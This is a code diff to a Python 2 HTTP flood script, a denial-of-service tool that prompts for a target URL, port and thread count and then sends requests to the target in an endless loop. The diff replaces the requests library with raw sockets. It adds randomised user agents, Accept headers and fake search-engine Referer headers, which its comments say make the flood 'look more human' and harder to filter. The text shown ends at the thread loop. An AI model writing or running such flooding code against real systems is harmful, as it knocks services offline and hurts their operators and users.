@@ -1,8 +1,12 @@
-import requests
-from random import choice
+import socket
+import random
 import threading
 url=raw_input("[+] Enter the target URL: ")
-tn=int(raw_input("[+] Enter the number of threads (higher threads, faster packet sending, but more internet bandwith used): "))
+port=raw_input("[+] Enter the port to attack: ")
+try:
+  tn=int(raw_input("[+] Enter the number of threads (higher threads, faster packet sending, but more internet bandwith used): "))
+except:
+  print("[-] Sorry, input needs to be an integer.")
 # damn a lot of user agents
 useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
               "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -21,13 +25,37 @@ useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Fir
               "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
               "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
 ]
-headers = {
-  'User-Agent': choice(useragents)
-}
+# make it look more human
+acceptall = [
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept-Encoding: gzip, deflate\r\n",
+    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
+    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+    "Accept-Language: en-US,en;q=0.5\r\n"
+]
+# make it look more human by looking like a search engine
+ref = ['http://www.bing.com/search?q=',
+       'https://www.yandex.com/yandsearch?text=',
+       'https://duckduckgo.com/?q=',
+       'https://google.com/search?q='
+]
+ua = "User-Agent: " + random.choice(useragents) + "\r\n"
+accept = random.choice(acceptall)
+reffer = "Referer: " + random.choice(ref) + str(url) + "\r\n"
+content = "Content-Type: application/x-www-form-urlencoded\r\n"
+length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(url), int(port))
+req_args = target_host + ua + accept + reffer + content + length + "\r\n"
 def httpspam():
   while True:
-    response=requests.get(url)
-    print("[+] HTTP request sent")
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((str(url), int(port)))
+      s.send(str.encode(req_args))
+      print("[+] HTTP request sent")
 threads = []
 # threading
 for i in range(tn):
